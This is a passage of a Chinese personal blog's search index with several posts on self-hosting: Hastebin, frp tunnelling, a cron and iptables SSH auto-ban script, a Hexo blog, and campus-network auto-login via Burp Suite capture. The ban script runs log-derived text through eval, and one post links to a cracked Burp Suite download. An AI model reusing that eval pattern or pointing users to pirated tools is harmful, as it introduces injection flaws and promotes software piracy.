    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景：</h2><p>代码分享是一件很常见的事，之前我的代码分享一直都是qq传文件，高阶一点的就是用python的http.server来局域网传文件，但是都不够优雅。<a href="https://paste.ubuntu.com/">Ubuntu Pastebin</a>貌似是比较好的选择，但是我又不知足，我想在自己的服务器上搭建一个代码分享服务。在网上找了一圈，由于我蹩脚的搜索能力，没有找到合适的开源项目，便搁置了。</p><p>在昨天打ichunqiu某场比赛的时候，vaala找到了某个关键文件，它是这样来分享代码的，<a href="https://paste.vaala.cloud/wuhuhoxaqo.php">https://paste.vaala.cloud/wuhuhoxaqo.php</a>，点进去一看，我意识到这就是我想要的代码分享平台，简洁、高效，我记住了它的名字：<code>Hastebin</code>。</p><p>今天中午一起床就打算开始部署Hastebin，一想到这种好项目一定有docker镜像，肯定一pull，一run，直接运行，简单的一批，不料这直接耗费了我一个下午。</p><h2 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程：</h2><p>由于官方文档年久失修，且没有提供现成的docker镜像，在中途主要遇到了以下主要问题。</p><ol><li><p>页面能够正常访问，但是无法保存文章</p></li><li><p>经过查看项目issue，我在其中找到了第一个问题的解决方法，即把容器的存储方式改为file。这里丢上链接<a href="https://github.com/toptal/haste-server/issues/376">Issue #376 </a>，里面还有我的评论2333。</p></li><li><p>我十分开心，以为我已经成功部署了hastbin，直到我试着用手机访问我生成的链接。</p></li><li><p>我发现我的手机只能看到一个hastebin图标和绿色的背景，且所有按钮全黑不能进行任何操作。</p></li><li><p>这个问题极为离谱，我是在实验室机器上部署的服务，但是只有我自己的笔记本能够正常访问、写文章和保存。其他同学包括我自己的手机甚至都无法正常打开页面，我都怀疑是量子纠缠了。</p></li></ol><h2 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法：</h2><ul><li><p>经过我缜密的分析，我觉得一定是官方dockerfile和docker-compose太傻逼了。</p></li><li><p>用别人构建好的镜像，并使用file存储方式，一举成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull jonasled/haste-server<br>docker run -d --name haste-server -p 7777:7777 -e STORAGE_TYPE=<span class="hljs-string">&quot;file&quot;</span> -e STORAGE_FILEPATH=<span class="hljs-string">&quot;data&quot;</span> jonasled/haste-server<br></code></pre></td></tr></table></figure></li></ul><h2 id="成果演示"><a class="markdownIt-Anchor" href="#成果演示"></a> 成果演示：</h2><p><img src="https://upyun.wuuconix.link/image-20210801190016493.png" alt="hastebin截图" /></p><p>欢迎使用！</p><p><a href="http://paste.wuuconix.link">http://paste.wuuconix.link</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>hastbin</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>将恶意ip加入ssh黑名单的自动化shell脚本实现</title>
    <link href="/2021/07/29/AutoBan/"/>
    <url>/2021/07/29/AutoBan/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>之前用frp，实现了22端口的内网穿透，在公网可以直接ssh连接我的实验室主机。方便的同时，也带来了非常恐怖的事情。</p><p>下面这张图是之前我前天截的。</p><div align="center">    <img src="https://upyun.wuuconix.link/image-20210730001455959.png" alt="令人害怕的日志" style="zoom: 80%;" /></div><p>我们可以看到这个骇客利用某种强悍的技术每秒钟3次甚至有时候每秒6次来试图ssh连接我的实验室机器。使得frps的日志文件里整页都是这些记录，让人看了十分害怕，当时我被迫暂停ssh的内网穿透服务，向这位骇客妥协了。</p><p>今天闲来无事，遂决定写一个脚本来自动ban这些恶意连接的ip。</p><h2 id="实现过程"><a class="markdownIt-Anchor" href="#实现过程"></a> 实现过程</h2><p>经过一些周折之后写完了以下shell脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-function"><span class="hljs-title">formatip</span></span>()&#123;<br>    ip__=<span class="hljs-variable">$1</span><br>    ip_=<span class="hljs-variable">$&#123;ip__%%:*&#125;</span><br>    ip=<span class="hljs-variable">$&#123;ip_:1&#125;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$ip</span><br>&#125;<br><br>time_now=`<span class="hljs-built_in">date</span> <span class="hljs-string">&#x27;+%Y/%m/%d %H:%M:%S&#x27;</span>`<br><span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">tail</span> -n 1 /root/frp_0.37.0_linux_386/nohup.out | awk <span class="hljs-string">&#x27;&#123;printf(&quot;time=%s\ %s type=%s ip=%s&quot;), $1, $2, $6, $11&#125;&#x27;</span>)<br>difference=$((`date +%s -d &quot;<span class="hljs-variable">$time_now</span>&quot;`-`date +%s -d &quot;<span class="hljs-variable">$time</span>&quot;`))<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$type</span> == <span class="hljs-string">&quot;[ssh]&quot;</span> -a <span class="hljs-variable">$difference</span> -le 60 ]<br><span class="hljs-keyword">then</span><br>    ip=<span class="hljs-string">&quot;<span class="hljs-subst">$(formatip $ip)</span>&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;`  倒数第一条发现ssh请求 时间 <span class="hljs-variable">$time</span>  ip <span class="hljs-variable">$ip</span>&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban.log<br>    array=($(<span class="hljs-built_in">tail</span> -n 3 /root/frp_0.37.0_linux_386/nohup.out | awk <span class="hljs-string">&#x27;&#123;print $1, $2, $6, $11&#125;&#x27;</span>))<br>    time2=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;array[4]&#125;</span> <span class="hljs-variable">$&#123;array[5]&#125;</span>&quot;</span> <br>    type2=<span class="hljs-variable">$&#123;array[6]&#125;</span><br>    ip2=<span class="hljs-string">&quot;<span class="hljs-subst">$(formatip $&#123;array[7]&#125;)</span>&quot;</span><br>    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$type2</span> == <span class="hljs-string">&quot;[ssh]&quot;</span> ]<br>    <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;`  倒数第二条发现ssh请求 时间 <span class="hljs-variable">$time2</span>  ip <span class="hljs-variable">$ip2</span>&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban.log<br>        end=`<span class="hljs-built_in">date</span> +%s -d <span class="hljs-string">&quot;<span class="hljs-variable">$time</span>&quot;</span>`<br>        start=`<span class="hljs-built_in">date</span> +%s -d <span class="hljs-string">&quot;<span class="hljs-variable">$time2</span>&quot;</span>`<br>        difference=$((<span class="hljs-variable">$end</span>-<span class="hljs-variable">$start</span>))<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$difference</span> -le 5  -a <span class="hljs-variable">$ip</span> == <span class="hljs-variable">$ip2</span> ]<br>        <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;`  时间差 <span class="hljs-variable">$difference</span> s&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban.log<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;`  倒数第二条和倒数第一条ssh请求ip一致，请求时间差小于5s&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban.log<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;`  发现重大嫌疑目标&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban.log<br>            time3=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;array[0]&#125;</span> <span class="hljs-variable">$&#123;array[1]&#125;</span>&quot;</span> <br>            type3=<span class="hljs-variable">$&#123;array[2]&#125;</span><br>            ip3=<span class="hljs-string">&quot;<span class="hljs-subst">$(formatip $&#123;array[3]&#125;)</span>&quot;</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;`  倒数第三条发现ssh请求 时间 <span class="hljs-variable">$time3</span>  ip <span class="hljs-variable">$ip3</span>&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban.log<br>            end=`<span class="hljs-built_in">date</span> +%s -d <span class="hljs-string">&quot;<span class="hljs-variable">$time2</span>&quot;</span>`<br>            start=`<span class="hljs-built_in">date</span> +%s -d <span class="hljs-string">&quot;<span class="hljs-variable">$time3</span>&quot;</span>`<br>            difference=$((<span class="hljs-variable">$end</span>-<span class="hljs-variable">$start</span>))<br>            <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$difference</span> -le 5  -a <span class="hljs-variable">$ip2</span> == <span class="hljs-variable">$ip3</span> ]<br>            <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;`  时间差 <span class="hljs-variable">$difference</span> s&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban.log<br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;`  倒数第三条和倒数第二条ssh请求ip一致 请求时间差小于5s&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban.log<br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;`  已经锁定目标ip <span class="hljs-variable">$ip</span>  准备开ban&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban.log<br>                iptables -I INPUT -p tcp -s <span class="hljs-variable">$ip3</span> --dport 8022 -j DROP<br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;`  已经成功ban掉ip <span class="hljs-variable">$ip</span>&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban.log<br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;`  已经成功ban掉ip <span class="hljs-variable">$ip</span>&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/fruits<br>            <span class="hljs-keyword">fi</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`date &#x27;+%Y/%m/%d %H:%M:%S&#x27;`  1分钟内没有新的请求！&quot;</span> &gt;&gt; /root/frp_0.37.0_linux_386/autoban.log<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>其实现的主要功能主要是去读取frps的日志文件，查看最后三条记录，看它们是不是都是ssh请求，请求的时间是不是隔的特别近。如果是，就被判定为恶意ip，利用iptables命令进行拉黑操作。</p><p>写完了脚本，那我们怎么让它定时自动执行呢？</p><p>这里我用到了<code>crontab</code>这个强大的工具。</p><p>在Ubuntu Server 20.04 LTS中只需要在<code>/etc/crontab</code>文件中添加一条以下的记录，即可实现每分钟自动运行。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">*</span> <span class="hljs-emphasis">*   *</span> <span class="hljs-emphasis">* *</span>   root    bash /root/frp<span class="hljs-emphasis">_0.37.0_</span>linux<span class="hljs-emphasis">_386/autoban.sh</span><br></code></pre></td></tr></table></figure><h2 id="效果演示"><a class="markdownIt-Anchor" href="#效果演示"></a> 效果演示</h2><p><img src="https://upyun.wuuconix.link/image-20210730002417148.png" alt="无请求的状态" /></p><p><img src="https://upyun.wuuconix.link/image-20210730003046896.png" alt="有恶意ip访问的状态" /></p><div align="center">    <img src="https://upyun.wuuconix.link/image-20210730002924003.png" alt="手机连接失败" style="zoom:50%;" /></div><p>这里是用我的手机做的测试，可以看到手机已经连接不上了。</p><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><ul><li>通过这次实践熟悉了shell编程的强大之处、了解iptables命令的基本用法、了解crontab强大的定时执行功能</li><li>虽然好像今天没有恶意ip来连接我ssh了，测试都是用的我自己的手机2333。但是这也是好事，以后可以没有后顾之忧地使用ssh内网穿透到我的实验室机器啦！</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>ssh</tag>
      
      <tag>shell</tag>
      
      <tag>crontab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用frp内网穿透工具给阿里云服务器减压</title>
    <link href="/2021/07/28/Frp/"/>
    <url>/2021/07/28/Frp/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>我在实验室的机器配置较高，内存有8G，而阿里云服务器的内存只有2G。之前校园网里的博客和公网的博客是分别在实验室机器和阿里云服务器上开了两个docker，都分别绑定了机器上的文件，然后这这些文件通过github实现同步。但是它不会自动同步，需要手动在一台机器上docker push和另一台机器上docker pull。此外，同时开两个docker对阿里云服务器的性能有些浪费，毕竟2G内存是拙荆有点捉襟见肘了（其实貌似也没有占多少内存2333</p><h2 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案"></a> 解决方案</h2><p>利用<a href="https://github.com/fatedier/frp">frp</a>这款简洁又强大的内网穿透工具，利用某种机制实现内网机器的服务可以被公网访问到。</p><p>其具体实现的原理大概是，公网机器运行frps作为服务端，内网机器运行frpc作为客户端，两者进行某种连接。当有公网请求时，公网就会把请求转发到内网机器上，内网机器发送相应后，再发送回公网机器，公网机器再返回给用户。相当于利用公网机器做了一个跳板。</p><p>同时我在frp客户端也就是我的实验室机器上配置了多个web服务。具体配置文件如下。</p><p><img src="https://upyun.wuuconix.link/image-20210729000820252.png" alt="frpc.ini" /></p><ul><li><p>当用户访问blog二级域名时，会被转发到我实验室机器的80端口，实现博客页面的展示。</p></li><li><p>访问cloud二级域名时，会被转发到我运行在8080端口的nextcloud个人网盘服务。</p></li><li><p>访问docs二级域名时，会被转发到3000端口的codimd服务。</p></li><li><p>而值得注意的是，这些二级域名实际上都是绑的一个ip，那就是我阿里云服务器的ip。</p></li></ul><p>二级域名让用户更清楚的知道自己要访问的是什么服务，完成了类似nginx反向代理的操作，而我这里用到的只是frp。</p><p>同时利用nohup命令让frp在后台运行，就能够持续的实现内网穿透了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#服务器端</span><br><span class="hljs-built_in">nohup</span> ./frps -c ./frps.ini &amp;<br><span class="hljs-comment">#客户端</span><br><span class="hljs-built_in">nohup</span> ./frpc -c ./frpc.ini &amp;<br></code></pre></td></tr></table></figure><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>利用frp技术，我的博客只需要在实验室机器上运行docker就行，做到了一处修改，两处同步更新，还减少了服务器的负担。此外利用frp还实现了反向代理的操作，在这里向作者送上崇高的敬意！</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>frp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人图床的搭建</title>
    <link href="/2021/07/27/image-host/"/>
    <url>/2021/07/27/image-host/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>之前写过许多博文，放在<a href="https://blog.csdn.net/Cypher_X">csdn</a>上，在本地用typora写后导入到csdn的时候，就会发现图片加载错误，原因是之前的文件都是存在本地的，所以只能将一张张图片上传到csdn，最后才能正常显示，图片在csdn上的链接大概长这样 <a href="https://img-blog.csdnimg.cn/20210331202741724.png">链接</a>。这样每次手动点击图片就显得非常麻烦。之前想解决这个问题，了解到了这个图床这种解决方案，但是没有深入下去。</p><p>今天在gitee上新建了一个仓库，配合上picGo这款神奇的软件，建了一个简单的图床。</p><h2 id="实际体验"><a class="markdownIt-Anchor" href="#实际体验"></a> 实际体验</h2><ul><li>在typora中直接插入一张图片的时候，这张图片会自动进行上传，然后把把这张图片的链接切换为gitee上的链接，这就实现了不论在哪里，这篇markdown文章的图片都能够正常访问。</li></ul><p><img src="https://upyun.wuuconix.link/image-20210728012009709.png" alt="图片自动上传并生成链接" /></p><ul><li>如果我想把博文放到hexo里边的话，也非常方便，我只需要在windows主机里用typora写好，然后到时候直接复制markdown代码就行，而不用把图片也复制过去。</li></ul><h2 id="为什么不用github当图床"><a class="markdownIt-Anchor" href="#为什么不用github当图床"></a> 为什么不用github当图床？</h2><ul><li>会滥用github资源，影响其他用户体验</li><li>每次上传图片picGo相当于都会对我的github进行commit操作，到时候我的github记录肯定都是全绿的，结果一看，其实啥都没干233。</li><li>速度太慢，其实这篇博文一开始的写的是用github来当图床，但是实际上去访问自己博客的使用，不挂代理图片根本加载不出来，不符合实际</li></ul><h2 id="用gitee当图床的优点"><a class="markdownIt-Anchor" href="#用gitee当图床的优点"></a> 用gitee当图床的优点</h2><ul><li>解决了用github当图床的所有痛点，稳定又高效。</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>图床</tag>
      
      <tag>gitee</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人博客的搭建</title>
    <link href="/2021/07/26/Blog/"/>
    <url>/2021/07/26/Blog/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>目前我的博客是放在docker中，然后机器提供服务。但是如果只是在docker中进行修改，比如创建新文章，而在主机里没有备份的话，下次重开容器你的所有文章都会无。</p><p>以下是我的解决方法。首先github上创建一个仓库，克隆到本地。然后在新建容器的时候把文件绑定到仓库里的某个文件夹中。然后再进入容器进行写文章，比如hexo new test，就会再source/_posts/中新建一个test.md，我们可以在容器里直接写，但那样很麻烦。因为我们一开始生成容器的时候已经绑定了文件夹，容器内部的变化会直接影响主机的变化，所以我们可以快乐的在主机里进行写文章。</p><p>而且这样相当于主机里有了虚拟机内部实时的文件。</p><p>然后写完某篇文章后再git push到github，妈妈再也不用担心我写的博文丢失了！</p><h2 id="使用方法"><a class="markdownIt-Anchor" href="#使用方法"></a> 使用方法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t hexo-server .<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -itd --name hexo-server -v /root/wuuconix-s-blog/blog:/root/blog -p 80:4000 hexo-server bash<br></code></pre></td></tr></table></figure><h2 id="博客地址"><a class="markdownIt-Anchor" href="#博客地址"></a> 博客地址</h2><ul><li>校园网访问 <a href="http://wuuconix.xyz/">http://wuuconix.xyz/</a></li><li>公网访问 <a href="https://wuuconix.link/">https://wuuconix.link/</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>hexo</tag>
      
      <tag>github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>校园网自动认证python脚本的实现</title>
    <link href="/2021/07/25/AutoLogin/"/>
    <url>/2021/07/25/AutoLogin/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景：</h2><p>之前购买了一台ubuntu server放在实验室里准备当服务器，安装好后准备ssh连，发现怎么也连不上，突然发现原来还没有校园网认证。之后花了大力气没有搞定，最终被迫买了一台小米4A路由器来实现ubuntu server的上网。</p><p>利用路由器的<a href="https://baike.baidu.com/item/%E9%9D%9E%E5%86%9B%E4%BA%8B%E5%8C%96%E5%8C%BA">DMZ</a>功能，将server的所有端口全部转发出去，相当于访问实验室的ip直接访问到了server，还挺方便。</p><p>之后无敌的vaala看到了我的路由器，便和我说起了他的windows上的校园网自动认证脚本。</p><blockquote><p>linuxs上的自动认证很简单的，windows还需要整各种东西，麻烦的要死。 ——vaalacat</p></blockquote><p>我便萌生了自己写一个自动认证脚本的想法。</p><h2 id="主要思路"><a class="markdownIt-Anchor" href="#主要思路"></a> 主要思路：</h2><ol><li><p>访问<a href="http://www.msftconnecttest.com/redirect">http://www.msftconnecttest.com/redirect</a>,这是微软官方跳转页面。我们在校园网没有连上的情况下访问，会返回以下结果。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://www.msftconnecttest.com/redirect<br>&lt;script&gt;top.self.location.href=<span class="hljs-string">&#x27;http://172.26.156.158/eportal/index.jsp?wlanuserip=6b0dec7423e70a581b2fdb0517f86594&amp;wlanacname=c21078ebee2bcf114f01433fbc2251db:&amp;ssid=&amp;nasip=cb287e62ace185edc3fe204ece33bff2&amp;snmpagentip=&amp;mac=7fc6643e4951e6fdcbeed331dffbbdcb&amp;t=wireless-v2&amp;url=bce0e6cfc64b38a70de132171bb75a3c9c9fd810bbc35379df1f2cd44001cac3edab421ca50cdf5e&amp;apmac=&amp;nasid=c21078ebee2bcf114f01433fbc2251db&amp;vid=7c88e8aa1edda8df&amp;port=6602c686c4c12d10&amp;nasportid=d4fc8695056bf48b4ed4e589f32650aa8b36e3d59b1b63d1cfaa8c5c0218407a3db653ca579e88c9&#x27;</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>这实际上返回了一个网页的内容，这个网页只有一个script标签，当我们访问到这个网页，就会被跳转到后面的一大串url。而那个url实际上就是我们的校园网的登录界面。</p><p>这个url里有非常多的信息，这些信息我们在之后post请求的时候都需要。</p></li><li><p>无敌Burpsuite yyds！之前做ctf题只是稍微了解了burpsuite，没有了解到他的强大。这次我下定决心，在windows上安了一个<a href="https://www.ddosi.com/burpsuite2021-5-1/">Burpsuite2021-5-1破解版</a>(不管系统干不干净了，大不了之后重装2333).</p><p>跟着教程破解好之后，我们设置好监听，然后在这个校园网认证界面登录抓包。我们就会获得一个http请求包，我们可以看到，每次请求实际上请求了下面这个接口</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://172.26.156.158:80/eportal/InterFace.do?method=login<br></code></pre></td></tr></table></figure><p>我们抓到包了，那如何能够把这个包转化为我们熟悉的python requests请求来实现自动化登录呢？这时候就需要介绍到Burpsuite中强大的插件库了，(之前用都不知道有插件库这个东西555，太菜了)</p><p>我们在Burpsuite的菜单栏里点击Extender，然后点击下方的BApp Store, 安装一个<code>Copy As Python-Requests</code>插件，然后在报文段右键选择<code>Extensions-&gt;Copy as requests</code>然后再复制到一个python文件里，你就获得了一份代码非常规范完美的requests脚本啦！</p><p>之后的工作就简单了，详情见我的<a href="https://github.com/wuuconix/AutoLogin">github</a></p></li></ol><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><ol><li>这次经历算是真正意义上第一次把所学的东西用来解决问题的的实践。</li><li>写好了脚本，准备去把实验室的路由器拿回来。突然想到要是拿回来了，到时候在实验室只有ubuntu-server能上网，笔记本上不了网(实验室只有一根网线，配的静态ip)，好像路由器还必须放在那了2333。</li><li>虽然脚本写好了没有实际派上用场，但是写完了还是很高兴。也希望能够帮助到之后需要的同学!</li></ol><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
